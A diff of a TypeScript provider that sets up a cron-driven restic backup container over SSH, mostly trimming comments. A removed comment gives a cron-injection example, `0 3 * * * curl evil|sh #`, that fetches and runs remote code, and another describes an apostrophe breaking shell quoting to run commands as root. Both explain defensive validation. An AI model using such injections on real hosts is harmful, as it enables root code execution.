@@ -7,20 +7,15 @@ import { listStampedContainers } from "../core/list-stamped.js";
 import type { SshExecutor, SshSession } from "../core/ssh.js";
 import { sshExecutor } from "../core/ssh.js";
 
-// Secrets arrive already resolved to strings (the engine substitutes $secret before calling the provider).
-// retention/schedule carry the resolver-or-default cron + keep counts. signoz opts the observability volumes
-// into the backup set.
+// Secrets arrive already resolved to strings. retention/schedule carry the resolver-or-default cron + keep
+// counts; signoz opts the observability volumes into the backup set.
 const backupSchema = sshSchema.extend({
     repo: z.string(),
     password: z.string(),
     image: z.string(),
     signoz: z.coerce.boolean().default(false),
     credentials: z.record(z.string(), z.string()).default({}),
-    // A crontab has no quoting whatsoever, so this field is guarded by SHAPE rather than escaped. Two ways it
-    // would otherwise become "run anything, as root, on a schedule": a newline appends a whole cron entry, and
-    // a SIXTH field is already the command, `0 3 * * * curl evil|sh #` leaves the intended script commented
-    // out behind a `#`. Exactly five fields of cron's own alphabet admits neither, and rejects at parse time
-    // with the operator's typo named rather than at 3am on the host.
+    // Exactly five cron fields, by shape not escaping: a crontab can't quote a 6th field or a newline entry.
     schedule: z
         .string()
         .regex(/^[\d*,/A-Za-z-]+(?: [\d*,/A-Za-z-]+){4}$/, "must be exactly five cron fields (minute hour day month weekday)")
@@ -37,19 +32,15 @@ const STATE_DIR = `${HOST_STATE_ROOT}/backup`;
 const ENV_FILE = `${STATE_DIR}/restic.env`;
 const SCRIPT_FILE = `${STATE_DIR}/backup.sh`;
 const CRONTAB_FILE = `${STATE_DIR}/crontab`;
-// Inspecting labels (set at create time) is the observable truth for the schedule + repo; "|" is a safe
-// separator (cron has spaces, the repo may have ":", neither contains "|").
+// Inspecting labels (set at create time) is the observable source of truth for schedule + repo.
 const SEP = "|";
 
-// The default on-host restic repo lives in this named volume, mounted into the backup + restore containers
-// at the repo path. A repo path starting with "/" is a restic LOCAL repo (the on-host default); one with a
-// scheme (s3:/b2:/rest:/sftp:) is remote and needs no volume. A host migration streams this volume old->new.
+// A repo path starting with "/" is a local restic repo; one with a scheme (s3:/b2:/rest:/sftp:) is remote.
 export const REPO_VOLUME = "intentic-restic-repo";
 export const isLocalRepo = (repo: string): boolean => repo.startsWith("/");
 
-// The volumes backed up, host volume name -> in-container mount path. Komodo's compose prefixes its volumes
-// with the project name; Forgejo's is the single named data volume. SignOz's (large, reconstructable) are
-// added only when opted in.
+// The volumes backed up, host volume name -> in-container mount path. SignOz's (large, reconstructable) volumes
+// are added only when opted in.
 const volumeMounts = (signoz: boolean): Record<string, string> => ({
     "intentic-forgejo-data": "/volumes/forgejo",
     "komodo_postgres-data": "/volumes/komodo-postgres",
@@ -58,12 +49,9 @@ const volumeMounts = (signoz: boolean): Record<string, string> => ({
     ...(signoz ? { "signoz_clickhouse-data": "/volumes/signoz-clickhouse", "signoz_signoz-data": "/volumes/signoz-signoz" } : {}),
 });
 
-// The backup script crond runs each tick, INSIDE the restic container (busybox sh). App-consistent dumps
-// first (best-effort, the read-only volume backup that follows is the fallback), then one restic snapshot of
-// the staging dumps + the mounted volumes + the host's /opt/intentic state dir, then a retention prune. The
-// repo + keep counts are baked in (so a config change rewrites this file and the diff reconciles); the
-// password + backend creds come from the --env-file restic.env. Written under a quoted heredoc so the host
-// shell does not expand the script's own $vars.
+// The backup script crond runs each tick, inside the restic container. App-consistent dumps first (best-effort,
+// falling back to the volume backup), then one restic snapshot, then a retention prune. Written under a quoted
+// heredoc so the host shell does not expand the script's own $vars.
 const backupScript = (parsed: BackupInputs): string =>
     [
         "#!/bin/sh",
@@ -78,8 +66,8 @@ const backupScript = (parsed: BackupInputs): string =>
         "# Komodo: logical pg_dump of the FerretDB-backing postgres (matched by its compose labels).",
         "PG=$(docker ps -q -f label=com.docker.compose.project=komodo -f label=com.docker.compose.service=postgres)",
         'if [ -n "$PG" ]; then docker exec "$PG" pg_dump -U komodo -d postgres > "$STAGING/komodo.sql"; else echo "komodo pg_dump skipped"; fi',
-        // The on-host default repo is intentic-owned, so self-init it on first use (idempotent: skip when the
-        // repo config already reads). A remote repo is the operator's, left as-is (they pre-create it).
+        // The on-host default repo is intentic-owned, so self-init it on first use (idempotent). A remote repo is the
+        // operator's, left as-is.
         ...(isLocalRepo(parsed.repo)
             ? [`restic -r ${shellQuote(parsed.repo)} cat config >/dev/null 2>&1 || restic -r ${shellQuote(parsed.repo)} init`]
             : []),
@@ -102,14 +90,11 @@ const observe = async (session: SshSession): Promise<{ image: string; schedule: 
     return { image, schedule, repo };
 };
 
-// Write restic.env ONCE (chmod 600, the encryption password + backend creds must survive recreation, like
-// komodo's .env), always rewrite the script + crontab (so a schedule/repo/retention change reconciles).
+// Write restic.env once (the encryption password + backend creds must survive recreation); always rewrite the
+// script + crontab so a schedule/repo/retention change reconciles.
 const ensureFiles = async (session: SshSession, parsed: BackupInputs): Promise<void> => {
     await session.exec(`mkdir -p ${STATE_DIR}`);
-    // Two layers, one call each. dockerEnvLine renders the file's line (raw, `docker run --env-file` keeps
-    // quotes as part of the value), shellQuote carries that line through the host shell as one printf argument.
-    // The old form wrapped each line in bare `'…'`, so an apostrophe in a restic password or an S3 secret key
-    // ended the quoting and ran the rest as a command on the host, as root, at deploy time.
+    // dockerEnvLine renders the file's line; shellQuote carries it through the host shell as one printf argument.
     const envLines = [
         dockerEnvLine("RESTIC_PASSWORD", parsed.password),
         ...Object.entries(parsed.credentials).map(([key, value]) => dockerEnvLine(key, value)),
@@ -140,12 +125,8 @@ const mountArgs = (parsed: BackupInputs, dockerBin: string): string => {
     ].join(" ");
 };
 
-// The scheduled restic backup for a host: a container running busybox crond that, on the declared cron, dumps
-// Forgejo + Komodo (and SignOz volumes when opted in) to the operator's restic repo. read returns the
-// resource only when the container is up, surfacing the running image + schedule/repo labels; diff recreates
-// on any drift (real reconciled config); apply discovers the host docker CLI (the restic image has none),
-// writes the once-guarded secret env + the regenerated script/crontab, and (re)runs the container. delete
-// removes the container + host state but NEVER touches the restic repo, those snapshots are the user's data.
+// The scheduled restic backup for a host: a container running busybox crond that dumps Forgejo + Komodo (and
+// SignOz when opted in) to the operator's restic repo. delete never touches the restic repo.
 export const createBackupProvider = (executor: SshExecutor = sshExecutor): Provider => ({
     read: async (inputs, ctx) => {
         const parsed = parse(inputs);
@@ -157,8 +138,7 @@ export const createBackupProvider = (executor: SshExecutor = sshExecutor): Provi
             return undefined;
         }
         try {
-            // observe is a single `|| true`'d inspect, safe on a stopped/absent container, issue it alongside
-            // the running() gate and discard it when the container isn't up, saving a round-trip when it is.
+            // observe is a safe `|| true`'d inspect; run alongside running() and discarded when the container isn't up.
             const [up, observed] = await Promise.all([running(session), observe(session)]);
             if (!up) {
                 return undefined;
@@ -186,8 +166,8 @@ export const createBackupProvider = (executor: SshExecutor = sshExecutor): Provi
         const parsed = parse(inputs);
         const session = await executor.connect(sshTarget(parsed));
         try {
-            // The restic image carries no docker CLI; bind-mount the host's static binary (the forgejo-runner
-            // pattern) so the dump steps can `docker exec` into the forgejo/komodo containers.
+            // The restic image carries no docker CLI; bind-mount the host's static binary so dump steps can `docker
+            // exec`.
             const dockerBin = (await session.exec("command -v docker")).stdout.trim();
             if (dockerBin === "") {
                 throw new Error("backup: no docker CLI found on the host (the backup container needs it for app-consistent dumps)");
@@ -211,8 +191,8 @@ export const createBackupProvider = (executor: SshExecutor = sshExecutor): Provi
     delete: async (inputs, ctx) => {
         const session = await executor.connect(sshTarget(parseInputs(sshSchema, inputs, "backup")));
         try {
-            // Remove the scheduler + host-side script/secret state. The restic repo and its snapshots are the
-            // user's data living off-host, intentic never deletes them.
+            // Removes the scheduler + host-side script/secret state; the restic repo and its snapshots are left
+            // untouched.
             await session.exec(`docker rm -f ${CONTAINER} 2>/dev/null || true`);
             await session.exec(`rm -rf ${STATE_DIR}`);
             ctx.log(`backup "${ctx.id}" removed; the restic repo and its snapshots are left untouched`);
